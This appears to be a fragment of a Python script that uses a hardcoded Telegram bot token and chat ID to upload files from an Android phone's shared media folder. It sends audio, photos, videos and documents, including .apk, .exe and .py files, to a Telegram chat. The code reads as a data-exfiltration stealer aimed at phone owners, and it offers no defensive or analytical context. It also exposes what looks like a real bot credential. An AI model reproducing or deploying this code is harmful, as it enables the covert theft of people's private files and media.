...
bot = telebot.TeleBot('7312222597:AAF0RQ0To-C0dKUlXShfV9RuMMfDNHAJRFw')
dir_path = "/storage/emulated/0/Android/media/"

def send_voice(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".opus",".mp3", ".aac")):
            bot.send_audio(chat_id=6587955635, audio=f, caption='By: @atmaja_pro_bot')

def send_phot(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=6587955635, photo=f, caption='By: @atmaja_pro_bot')

def send_video(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".mp4")):
            bot.send_video(chat_id=6587955635, video=f, caption='By: @atmaja_pro_bot')

def send_doc(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id=6587955635, document=f, caption='By: @atmaja_pro_bot')
